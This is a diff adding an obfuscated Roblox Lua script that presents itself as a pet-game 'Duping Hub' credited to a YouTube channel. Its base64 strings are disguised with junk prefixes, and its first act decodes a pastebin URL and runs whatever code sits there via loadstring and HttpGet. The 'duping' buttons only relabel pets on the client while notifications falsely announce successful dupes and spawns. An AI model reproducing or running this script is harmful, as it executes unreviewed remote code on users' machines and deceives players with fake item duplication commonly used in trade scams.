@@ -1,0 +1,275 @@
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
+
+data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+
+
+ 
+
+
+local Library = loadstring(game:HttpGet(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('YknHiXXxrbXiHkAErqUDRTExxwrnmCjCbHPqcPcaWfZYreciPNnvWUBaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3ZmZjFiUTlG')))()
+local Window = Library.CreateLib(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('odwFGvDJlixkldHwxjkYDXlrrPFSJHvMfXZQypicBgsAjsnaNfSZKtbU2FmZXR5IEh1YvCflKUgVjMuMw=='), zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('XQadsFncpqDCHDvyoHHLECfDGTIaMmcgOEIFAaRYDyPsvalPGOhWEhAQmxvb2RUaGVtZQ=='))
+
+--New Tab
+
+local Tab = Window:NewTab(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('tBfvTxbOKkXxlFJCyvjqdgRjRFugvBZLEiVAXLYSoCJVaBULyqaZdPSRHVwaW5nIEh1Z2Xwn5Cx'))
+local Section = Tab:NewSection(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('ZiXHDlzkoHIBAYeFfJwzlGMuryllgFIrWABkhzvuIgLbxSdEJXwNUDAU3Vic2NyaWJlIFRvIE15IENoYW5uZWw='))
+
+Section:NewLabel(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('JvvFrOuEBRPjlbvUcWstAinSgjiWxkiKLwhMNhmIsGjiTIGTPxylhIHU2NyaXB0IE1hZGUgQnkgUHJvZGlneUxlZ2VuZHNIUSBPbiBZb3VUdWJl'))
+
+Section:NewTextBox(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('DHzEpYHYiCFbdopyVjMOTckSxvZbOhVojsCoagPHdwROyudMAzGKlOdSHVnZSBOYW1l4pyP77iP'), zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('uZiISNKXBhuMsuQqSwpFkthvaiYEDdaVtbULZJxxaYXDNLskoesSmBTVGV4dGJveEluZm8='), function(txt)
+    game.StarterGui:SetCore(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('wrDuzPwSWupAUPbBobSwdDIyElhodkWsleVnNIPvjwzqhRbEdarmtIwU2VuZE5vdGlmaWNhdGlvbg=='),{
+        Title = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('QqLkSgIRTKnZhwCvMKYzCrTDrpIfUFPmbJydbHYEBdsUzXqjtZJHheBSHVnZSBOYW1l');
+        Text = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('jepgRURKRoSfzWSwoIeXDosvIbTvnVqPPYyAsXDAGIpRJNzRivdkoxpU2V0IFN1Y2Nlc3NmdWxseSE=');
+    })
+end)
+
+Section:NewTextBox(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('RhgyIkdbeaIWOhPeDUVomphzSDMUptIlwHQDIMCfpWeNEpllizrahpEQW1vdW50IER1cGXinI/vuI8='), zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('xkVnuHcQiDcHLVtJFHTkMKVnFkssWjZjmmjmVyLCnAcoWdelKNgASLlVGV4dGJveEluZm8='), function(txt)
+    game.StarterGui:SetCore(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('BXrbOTmmbmPhhXJWljJMxoJKTCMBYfBiBRRYxmstbjhvOioIhGpZqIEU2VuZE5vdGlmaWNhdGlvbg=='),{
+        Title = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('qBwJcmFeewNpYSNjaJKWXGLHwaLePAAcGeQKIbEqHJneMvooBycXHjoQW1vdW50IER1cGU=');
+        Text = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('uwBnvoKwwFFiHLzhWYHgVtfAXAzSwaFbYlMiaRpNrrNuOJhUpHmZcwuU2V0IFN1Y2Nlc3NmdWxseSE=');
+    })
+end)
+
+Section:NewButton(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('JPCTuJLlwxdvtlpjZZxCwjjivTelmNahHAfdyXTcZWzraXkRkhQDubqU3RhcnQgRHVwaW5n'), zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('XKWCZSLOmXDwyTUYbizlodWJwvMQTHrhPmwVikMmSnujTlzpBkTceMkQnV0dG9uSW5mbw=='), function()
+    local lib = require(game.ReplicatedStorage.Library)
+
+local fromPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('sXrTkVikpjxJQAfuusvWDOSjVCLqVUtTAcPbUPjAXtcYHPFKUWRUCkwRG9n')
+local toPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('zyuGOWvkwVhcnqcyiVuqRfDKYNAmROocJCtZxQKJsbaGtuLXPUKKAaQSHVnZSBTdG9ybSBBZ29ueQ==')
+
+for i,v in pairs(lib.Directory.Pets[fromPet]) do
+  lib.Directory.Pets[fromPet][i] = nil
+end
+for i,v in pairs(lib.Directory.Pets[toPet]) do
+  lib.Directory.Pets[fromPet][i] = v
+    end
+
+    local lib = require(game.ReplicatedStorage.Library)
+
+local fromPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('HYZwjRgONahTqZMJOzIrrCTVUwgBGASEvbrprTbYsvHrOqSDIhfXRurQ2F0')
+local toPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('ZXDeoqTWPnzaFUbGailuffiSkHFCPXpDzzBgirrbwKhiPZqirxibeWASHVnZSBTdG9ybSBBZ29ueQ==')
+
+for i,v in pairs(lib.Directory.Pets[fromPet]) do
+  lib.Directory.Pets[fromPet][i] = nil
+end
+for i,v in pairs(lib.Directory.Pets[toPet]) do
+  lib.Directory.Pets[fromPet][i] = v
+    end
+
+    local lib = require(game.ReplicatedStorage.Library)
+
+local fromPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('TLjZPnhyURKEYCkyIDJPgRohLwghCzHBwBXKQjgKvUmrpBoOOviZLxHQ29yZ2k=')
+local toPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('bxIjIGxJFRGljGgxpiyxNhBfkNlnfByHSriCKzWTTvuoKWBoDKNwayoSHVnZSBTdG9ybSBBZ29ueQ==')
+
+for i,v in pairs(lib.Directory.Pets[fromPet]) do
+  lib.Directory.Pets[fromPet][i] = nil
+end
+for i,v in pairs(lib.Directory.Pets[toPet]) do
+  lib.Directory.Pets[fromPet][i] = v
+    end
+
+    local lib = require(game.ReplicatedStorage.Library)
+
+local fromPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('aVRuedALsPrsiVlkigIwyzRRQpUbjyDbWZldJBGxktXYNDNSBsvSXCAQnVubnk=')
+local toPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('JPkPVyaaYluDbNnqXwEpDzXwbOXHqjmrBzRgezuUoLspwbJnGCpucbQSHVnZSBTdG9ybSBBZ29ueQ==')
+
+for i,v in pairs(lib.Directory.Pets[fromPet]) do
+  lib.Directory.Pets[fromPet][i] = nil
+end
+for i,v in pairs(lib.Directory.Pets[toPet]) do
+  lib.Directory.Pets[fromPet][i] = v
+    end
+
+    local lib = require(game.ReplicatedStorage.Library)
+
+local fromPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('CPjnnOjAwfhaXgsgMtNHcdUjAdqvPKKmNjBuZTghZKCMJBHWFvcjprKQXhvbG90bA==')
+local toPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('VnWACXTCUGJWPlEZDbJjCaPnugYAlKHWBkheoASvbcrUfDOafPjnxpySHVnZSBTdG9ybSBBZ29ueQ==')
+
+for i,v in pairs(lib.Directory.Pets[fromPet]) do
+  lib.Directory.Pets[fromPet][i] = nil
+end
+for i,v in pairs(lib.Directory.Pets[toPet]) do
+  lib.Directory.Pets[fromPet][i] = v
+    end
+
+    local lib = require(game.ReplicatedStorage.Library)
+
+local fromPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('nZAAcFnqzDHDxRHvSGpANURCYmpLZeAvqVZaNwGwTBTqCgmSxbNdtsHRGFsbWF0aWFu')
+local toPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('pvYKhASDcfNDnXOspXCEKKayqdocwhrmQlNJhTrIajescfVtrlmFgjvSHVnZSBTdG9ybSBBZ29ueQ==')
+
+for i,v in pairs(lib.Directory.Pets[fromPet]) do
+  lib.Directory.Pets[fromPet][i] = nil
+end
+for i,v in pairs(lib.Directory.Pets[toPet]) do
+  lib.Directory.Pets[fromPet][i] = v
+    end
+
+    local lib = require(game.ReplicatedStorage.Library)
+
+local fromPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('nXTPtEbkoqmKynYSBCKoyBJjnHjNaboSBlCRsHTYjMjEGWIWGwknAFIQ2hpY2s=')
+local toPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('wBzKBGFSnfAtiwhPhHjVgGwIMsFLyRYQlYoAMJweQDUhmLvakfXnqbJSHVnZSB1dG90')
+
+for i,v in pairs(lib.Directory.Pets[fromPet]) do
+  lib.Directory.Pets[fromPet][i] = nil
+end
+for i,v in pairs(lib.Directory.Pets[toPet]) do
+  lib.Directory.Pets[fromPet][i] = v
+    end
+
+    local lib = require(game.ReplicatedStorage.Library)
+
+local fromPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('jZGKUQFRhvhvsYJBJWGkcDyVsPKbDzLWZtLkYcGePSmPOYeVQPVCCjSRHVja3k=')
+local toPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('jVXdUnUZIajTRGoSdMFPngSIkYKzDvqWTbKKKTUfTUQiLHdCpgWJhpsSHVnZSBVdG90')
+
+for i,v in pairs(lib.Directory.Pets[fromPet]) do
+  lib.Directory.Pets[fromPet][i] = nil
+end
+for i,v in pairs(lib.Directory.Pets[toPet]) do
+  lib.Directory.Pets[fromPet][i] = v
+    end
+
+    local lib = require(game.ReplicatedStorage.Library)
+
+local fromPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('GIMszQXiOXGDiAGFehWKQWkeAkHZfUPnWBLbAyrOmMESVvNvAMcjHwsRWxlcGhhbnQ=')
+local toPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('SeSTzJcyBmoUeGAEarMiDVcGdFOwpxjxRNjJYmBPcqJTuIPWTDGHfOuSHVnZSBVdG90')
+
+for i,v in pairs(lib.Directory.Pets[fromPet]) do
+  lib.Directory.Pets[fromPet][i] = nil
+end
+for i,v in pairs(lib.Directory.Pets[toPet]) do
+  lib.Directory.Pets[fromPet][i] = v
+    end
+
+    local lib = require(game.ReplicatedStorage.Library)
+
+local fromPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('prKohVBIsXCpYrJCFHOyewymQWtdphPKUDfPjFgoewZVtqsNZnrgBflQmVl')
+local toPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('AfIjZUStqsJgdURNejEFOUJnaDByUegprcwdkyYNBZTZJmELGRevYskSHVnZSBVdG90')
+
+for i,v in pairs(lib.Directory.Pets[fromPet]) do
+  lib.Directory.Pets[fromPet][i] = nil
+end
+for i,v in pairs(lib.Directory.Pets[toPet]) do
+  lib.Directory.Pets[fromPet][i] = v
+    end
+  end
+
+)
+
+local Tab = Window:NewTab(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('XrCbYngAGgXgpSrOFgRyvbzaZacPsjRnRuZjarBIkmaTRwvezosCyqDVGl0YW5pYyBEdXBpbmfwn5Sl'))
+local Section = Tab:NewSection(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('uPHvfXkDnmunBhqocAEAwgwNNBICgxRlVNfHEgLZhScbvFrkAtgyKGHU3Vic2NyaWJlIFRvIE15IENoYW5uZWw='))
+
+Section:NewLabel(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('mycuunzWUigUTvkMqmlmsRiICiEswDwlqyPXIUXkcEbjFZYptpruXvoU2NyaXB0IE1hZGUgQnkgUHJvZGlneUxlZ2VuZHNIUSBPbiBZb3VUdWJl'))
+
+Section:NewTextBox(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('jCeDCgpooAcCvBNhAyfEKMdRUwIpcqvFnKDGRONUFxdnckKCYWWTATsVGl0YW5pYyBOYW1l4pyP77iP'), zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('BlFSBgxbNCQTWsKwPUItQvYIJOpzrWLUbIJoQUsaoBZjwVryvMaTGmOVGV4dGJveEluZm8='), function(txt)
+    game.StarterGui:SetCore(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('BjOttrrbngSnmlstpdCFwoYxNSvkACaLsZezdhwaBRjHUNIxiTwoAUQU2VuZE5vdGlmaWNhdGlvbg=='),{
+        Title = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('gkMEHLgKPXlLcyMCUuuQTODmbhabhKSSxSxczezchgckPucgnXNhFVYVGl0YW5pYyBOYW1l');
+        Text = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('NqAaeBbCBwAdGwkuGZKllhDzBXjwNvvWFHVWokgoQVzhDyCHSSyzOXHU2V0IFN1Y2Nlc3NmdWxseSE=');
+    })
+end)
+
+Section:NewButton(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('eQFYXJRYfTxhYkWHSssBEjVhubjDNhlSPcKCFfkUdcnXHfcOfANlAmsU3RhcnQgRHVwaW5n'), zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('AOSpsrAhZtcKHRmiWNIFBhmycWZkvRVCJyMOHavsEeEPfFVnynRyjMKQnV0dG9uSW5mbw=='), function()
+    local message = require(game.ReplicatedStorage.Library.Client.Message)
+message.Error(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('McKQAvMgEfdlLZNkbIHQcknlWNglcJVqHqWWdTcJXwAEKbcIgNGScSiVGl0YW5pYyBTa2V0Y2ggQ2F0IFN1Y2Nlc3NmdWx5IFNwYXduIFRvIHlvdXIgSW52ZW50b3J5LyBEdXBlIFN1Y2Nlc3NmdWx5'))
+
+    local lib = require(game.ReplicatedStorage.Library)
+
+local fromPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('mFQmgdtItKXTDmcbNTmilkKMhseJHPjumEvcurVdzcWcqnbwGIQuJoXRG9n')
+local toPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('kJrEoIFeOACXonohgsSSiZvJerRyhJqNPPTvLnLPyOKrxXvhqJAjRgyVGl0YW5pYyBNb25rZXk=')
+
+for i,v in pairs(lib.Directory.Pets[fromPet]) do
+  lib.Directory.Pets[fromPet][i] = nil
+end
+for i,v in pairs(lib.Directory.Pets[toPet]) do
+  lib.Directory.Pets[fromPet][i] = v
+    end
+
+Section:NewLabel(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('QBliZWJmvehOnkXXYcdzlEQDKBFLEegMMNaHbkqwDXpgoFCGQMuaodIRlBTIENoYW5nZXI='))
+
+Section:NewToggle(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('XioAEQGdfNjkoiixJvmcVaNzYojgyWKIaLQWfCenGSKZXByECvndentRlBTIExvY2sg8J+Ukg=='), zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('VIVrURxCdDGLQYtjOzKYyuwcssEAgHkXcudQvLiZJQkNLrfOydpJcZtVG9nZ2xlSW5mbw=='), function(state)
+    if state then
+        game.StarterGui:SetCore(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('ElIQfusAUOjVrAnFMRlQRyDHvitnLFTgLBcAwbpjIWzuqvOFhVMoJTGU2VuZE5vdGlmaWNhdGlvbg=='),{
+        Title = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('jukuKcXUhRjxgChHJJrJOrQBbMUpeAgzCHUOkazpIUrmBzvNmQzKWZkRlBTIExvY2sg8J+Ukg==');
+        Text = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('aZQwMqoGksGWUBBsNeokMFzpsnGKtcGGEhnpIopGIXPppZdNMOvYJkxRlBTIExvY2sgU2V0IFRvIDQwMA==');
+    })
+    else
+        game.StarterGui:SetCore(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('wWDyaxPhzfKEvjrPsvJfhGivRUUNEqFWBOSWLKgxoidplrfptkoFUTaU2VuZE5vdGlmaWNhdGlvbg=='),{
+        Title = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('htcLuQLfWuKPhUPQPJmRRXlCngXMEEtGYKTOzQEYCTDkwSSYhyGQohtRlBTIExvY2sg8J+Ukg==');
+        Text = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('wJwRkdRDWiRWrQhzpjPFDhmkxkkdrtTFVNgzfUPRHprDQORtvfGoFrvRlBTIExvY2sgRGlzYWJsZWQ=');
+    })
+    end
+end)
+  end
+
+)
+
+local Tab = Window:NewTab(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('XQEVUCKXhosOykeIEaBjYjeYuzzdttVnuuQwQYcWVtjDRDTOAtHcdeOR2VtcyBEdXBpbmfwn5KO'))
+local Section = Tab:NewSection(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('XHlzONDTKkPEFWuCDrFQoBkMoAGMVurDuZEDFszfYFnnzUDsxlwRHVuU3Vic2NyaWJlIFRvIE15IENoYW5uZWw='))
+
+Section:NewLabel(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('UiIduEdVeEwscWJKwocAcRXTHSuoHJSjqZbnFMWzUeKlYIwySYLCGJAU2NyaXB0IE1hZGUgQnkgUHJvZGlneUxlZ2VuZHNIUSBPbiBZb3VUdWJl'))
+
+Section:NewTextBox(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('DSpVdNpdrBiUsAYOifhQotiUwRSoAVHhmFZnAzawyUBbybMBwIycQGuVHlwZSBZb3VyIEdlbXPinI/vuI8='), zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('CTMHDKJPzqGkNrpBUipvBQdHEOhXDdIwMJQWRwkcEguYbrHxNOFAFePVGV4dGJveEluZm8='), function(txt)
+    game.StarterGui:SetCore(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('idhWLyOeKxbjMwCelLOPPRTNbPaOVJCJGlMFZeoOUECuIcypUkmLzCZU2VuZE5vdGlmaWNhdGlvbg=='),{
+        Title = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('XTyuJhdytmARjFBfjmdXCNLtjlsbtGZwFZIiuIpkkagDrEQcEGzSYhpWW91ciBHZW1z');
+        Text = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('MzxGElhvTooHxpMaPfQloqYhqiGORPjKCudwlznCUBXCzEqNaJkTFzVU2V0IFN1Y2Nlc3NmdWxseSE=');
+    })
+end)
+
+Section:NewTextBox(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('jptSaSSwEIiQYkTDKFiCVxGxqdGFquohDOJdekGYImsbqCyOVKHipOYVHlwZSBBbW91bnQgRHVwZeKcj++4jw=='), zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('JryzmbMLvlSwvKeowVFHQsAxjLtARyKUhhLoQFAThfjQDqHNOGFabEWVGV4dGJveEluZm8='), function(txt)
+    game.StarterGui:SetCore(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('HWQQXjamNTkeqhBOSHruNpyzgmtbxbMmKsYKknETdyfcxmUtCIINHoLU2VuZE5vdGlmaWNhdGlvbg=='),{
+        Title = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('GTyWmEVvbrJMxipyndlGJrwbYBkMdBLtKqrqcfeycaMGPEUnUcrQTzPQW1vdW50IER1cGU=');
+        Text = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('PSQvcjdbYFHWXtpExIgoCsTgeXnCKOrqAqMhxthJOSWbkBbpvJEnEqXU2V0IFN1Y2Nlc3NmdWxseSE=');
+    })
+end)
+
